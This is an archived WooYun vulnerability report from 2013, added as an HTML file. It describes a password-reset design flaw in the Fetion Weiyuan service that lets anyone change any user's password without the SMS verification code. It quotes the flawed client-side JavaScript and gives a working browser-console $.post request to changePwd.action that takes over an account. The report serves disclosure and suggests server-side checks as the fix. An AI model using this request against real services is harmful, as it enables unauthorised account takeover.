@@ -1,0 +1,309 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		飞信位缘某处设计缺陷可修改任意用户密码（非爆破）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		飞信位缘某处设计缺陷可修改任意用户密码（非爆破）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/索马里的海贼">索马里的海贼</a> 
+</li><li>提交时间：		2013-09-17 12:16</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">额。。为什么还有3呢。。。。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">注册 登陆 都绕过了 为什么还有三呢<br />
+<br />
+如果是已经注册的用户该怎么弄到他的号呢，找回密码<br />
+<br />
+来看看找回密码的逻辑<br />
+<br />
+</p><pre><code>function stepSubmit(){<br />
+var phone=$.trim($(&quot;#phone&quot;).val());<br />
+var validatecode=$.trim($(&quot;#validatecode&quot;).val());<br />
+if(phone==null||phone==&quot;&quot;){<br />
+	alert(&#039;请输入手机号&#039;);<br />
+	return;<br />
+}<br />
+<br />
+if(validatecode==null||validatecode==&quot;&quot;){<br />
+	alert(&#039;请输入验证码&#039;);<br />
+	return;<br />
+}<br />
+<br />
+$.ajax({<br />
+  	url: &#039;/passport/passport/getPasswordStep.action?flag=phone&amp;validatecode=&#039;+$.trim($(&quot;#validatecode&quot;).val())+&#039;&amp;phone=&#039;+$.trim($(&quot;#phone&quot;).val())+&#039;&amp;match=&#039;+Math.random(),<br />
+   	type: &quot;POST&quot;,<br />
+   	success: function(res){  <br />
+  		var jsonObj = eval(&quot;(&quot; + res + &quot;)&quot;);<br />
+  		var resData=jsonObj.PasswordResult;<br />
+		if(resData==&quot;3&quot;){<br />
+			alert(&quot;本日内您已经下发3次，请明天再试&quot;);<br />
+			return;<br />
+		} else if(resData==&quot;-1&quot;){<br />
+			alert(&quot;下发短信失败，请稍后再试&quot;);<br />
+			return;<br />
+		}else if(resData==&quot;0&quot;||resData==&quot;1&quot;||resData==&quot;2&quot;){<br />
+			alert(&quot;短信验证码发送成功！&quot;);//下发成功就直接跳了 那不管下发了 直接跟到下一个页面<br />
+			window.location= &#039;/passport/passport/getpassword1.action?mobile=&#039; + phone;<br />
+		}else{<br />
+  			reload_imaP();<br />
+			alert(jsonObj.PasswordResult);<br />
+			return;<br />
+  		}<br />
+	}<br />
+})<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+直接打开/passport/passport/getpassword1.action?mobile=13622222222<br />
+<br />
+<br />
+<br />
+</p><pre><code>function validate(){<br />
+var phoneValidate=$.trim($(&quot;#mobile&quot;).val());<br />
+if(phoneValidate==null||phoneValidate==&quot;&quot;){<br />
+alert(&#039;请输入手机验证码&#039;);<br />
+	return;<br />
+}<br />
+$.ajax({<br />
+   url: &#039;/passport/passport/codeValidate.action?flag=login&amp;value=&#039;+$.trim($(&quot;#mobile&quot;).val())+&#039;&amp;phone=&#039;+mobile+&#039;&amp;match=&#039;+Math.random(),<br />
+	   type: &quot;POST&quot;,<br />
+   success: function(res)<br />
+   {<br />
+	  var jsonObj = eval(&quot;(&quot; + res + &quot;)&quot;);<br />
+		var resData=jsonObj.PasswordResult;<br />
+	   if( jsonObj.code == &quot;false&quot;)<br />
+	   {	<br />
+		   if(resData==&quot;1&quot;){<br />
+			   alert(&#039;验证码超时失效&#039;);<br />
+			}else{	   <br />
+				alert(&#039;请输入正确验证码&#039;);<br />
+			}<br />
+<br />
+			return;<br />
+	   }<br />
+	   else<br />
+	   {	 <br />
+		   window.location= &#039;/passport/passport/getpassword2.action&#039;; //我去 又直接跳了<br />
+	   }<br />
+   },<br />
+   failure: function(res){<br />
+<br />
+	alert(&#039;请输入正确验证码&#039;);<br />
+	return;<br />
+	}<br />
+});<br />
+}</code></pre><p class='detail'><br />
+<br />
+再跟到下一个页面/passport/passport/getpassword2.action<br />
+<br />
+</p><pre><code>function changePwd(){<br />
+var first=$.trim($(&quot;#newPassword&quot;).val());<br />
+var second=$.trim($(&quot;#pnewPassword&quot;).val());<br />
+//省略<br />
+<br />
+var mobile = &#039;13622222222&#039;;<br />
+<br />
+//省略<br />
+<br />
+var params = {};<br />
+params[&quot;newpassword&quot;] = first;<br />
+params[&quot;mobile&quot;] = mobile;<br />
+<br />
+$.ajax({<br />
+  	url: &#039;/passport/passport/changePwd.action&#039;, <br />
+  	type:&quot;post&quot;,<br />
+  	dataType:&quot;text&quot;, <br />
+  	data:params, <br />
+  	error:function () {<br />
+		alert(&quot;error&quot;);<br />
+	},<br />
+   	success: function(res){<br />
+<br />
+    var jsonObj = eval(&quot;(&quot; + res + &quot;)&quot;);<br />
+  	var resData=jsonObj.PasswordResult;<br />
+  		<br />
+  	 	if(resData== &quot;ok&quot;){			//这。。。我了个去<br />
+  	 		alert(&quot;修改成功&quot;);<br />
+  	 		<br />
+  	 	 setTimeout(&#039;jumpPage()&#039;,1000);<br />
+  	 	}else if(resData== &quot;false&quot;){<br />
+  	 		alert(&quot;修改失败&quot;);<br />
+	  	 }else{<br />
+  	 		alert(resData);<br />
+		}<br />
+	}<br />
+})<br />
+}</code></pre><p class='detail'><br />
+<br />
+最后提交修改密码的步骤 只提交了手机号和新密码 短验又无视了 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">直接打开http://lbs.feixin.10086.cn//passport/passport/getpassword2.action<br />
+<br />
+其实不打开这个页面都无所谓<br />
+<br />
+</p><p class="detail"><a href="../images/171208475dcb722c1d745537e52d9ef576ece25f.png" target="_blank"><img src="../images/171208475dcb722c1d745537e52d9ef576ece25f.png" alt="reset.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+f12 console<br />
+<br />
+$.post(&#039;/passport/passport/changePwd.action&#039;, &#039;mobile=13622222222&amp;newpassword=a!11111111&#039;,function(data){alert(data);});<br />
+<br />
+</p><p class="detail"><a href="../images/17121056b43181ef1f59325da8f0c0d3f758d46a.png" target="_blank"><img src="../images/17121056b43181ef1f59325da8f0c0d3f758d46a.png" alt="reset2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+回车走你<br />
+<br />
+</p><p class="detail"><a href="../images/17121115ff900a764b8ab46c11bb47ef5bf87fcb.png" target="_blank"><img src="../images/17121115ff900a764b8ab46c11bb47ef5bf87fcb.png" alt="reset3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+这是成功了吧，拿新密码用上一个绕过短验登陆的exp测试 OK 又进去了<br />
+<br />
+<br />
+<br />
+终于完了 不会有四了 这仨漏洞加一块已经秒杀所有用户了<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">关键逻辑在服务端做判断 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/索马里的海贼" title="索马里的海贼">索马里的海贼</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-037365" title="飞信位缘某处设计缺陷可修改任意用户密码（非爆破）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-09-17 12:16</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="37365";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
